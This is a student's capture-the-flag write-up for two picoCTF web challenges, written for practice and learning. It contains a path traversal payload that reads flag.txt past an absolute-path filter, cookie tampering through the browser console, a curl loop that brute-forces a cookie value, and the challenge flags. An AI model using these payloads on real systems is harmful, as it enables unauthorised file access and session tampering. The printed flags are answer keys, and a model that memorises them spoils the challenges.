# Forbidden Paths

**Flag:**  `picoCTF{7h3_p47h_70_5ucc355_6db46514}`

How you approached the challenge:

  

- 3 pieces information are given in the question, first is the path of the flag , second is the path of the current directory and third is the fact that we cannot use absolute paths.  

- The search bar acts like the `cat` command, so if i put in something like `/flag.txt` in the search bar, it should give me the flag, but it won't because it is filtering out the absolute paths.
- So i need to go back to parent directories using `..` operator and then when i get inside `/` , i read `flag.txt`
```
../../../../flag.txt
```
Using this fetched me the flag.

What you learned through solving this challenge:

1. Using `..` operator to access any fi;e in any parent directory

# Cookies

  

**Flag:**  `picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}`


How you approached the challenge:
- First i noticed that on the website, i noticed that there is only one cookie by the name of `name` & value `-1` on `http://mercury.picoctf.net:54219/` , is i search for any value , say `hello world`, response comes from `http://mercury.picoctf.net:54219/search` which has an extra `session` cookie with some value.
![hello world search](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/hello_world.png)

- When we search for `snickerdoodle`,  we are redirected to `http://mercury.picoctf.net:54219/check` with a text saying `I love snickerdoodle cookies!`, and this page has a cookie with name `name` and value `0`.
![snickerdoodle search](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/snickerdoodle.png)

- If i try to change the value of the cookie manually to say `1`, then the page reloads and shows `I love chocolate chip cookies!`
```
document.cookie = "name=1; path=/";
```
![Cookie: name=1](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/chocolate_chip.png)
When i change the value to 2, it shows `I love oatmeal raisin cookies!`.

- So i created a shell script using `CURL` which sends `GET` requests to `http://mercury.picoctf.net:54219/check` modifying the value of cookie each time & greps `picoCTF` if found.
```bash
vishad@VISHAD:~$ vim script.sh

#!/bin/bash
for i in {0..100}
do
    curl -s -X GET "http://mercury.picoctf.net:54219/check" -b "name=$i" | grep "picoCTF" && echo "Found at $i"
done
```
On running this script i got the flag at `i=18`
```bash
vishad@VISHAD:~$ bash script.sh
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
Found at 18
```
I also manually checked it at the website by modifying the cookie there & got the flag.
```
document.cookie = "name=18; path=/";
``` 
![Cookie: name=18](https://github.com/loded-diper/cryptonite_tp_2/blob/main/Images/cookie_18.png)


What you learned through solving this challenge:

1. Modifying cookies using console

2. Using loops in scripts


Other incorrect methods you tried:

- Tried to search names & values of `name` and `session` cookie.

- Tried to search it in `.js` file
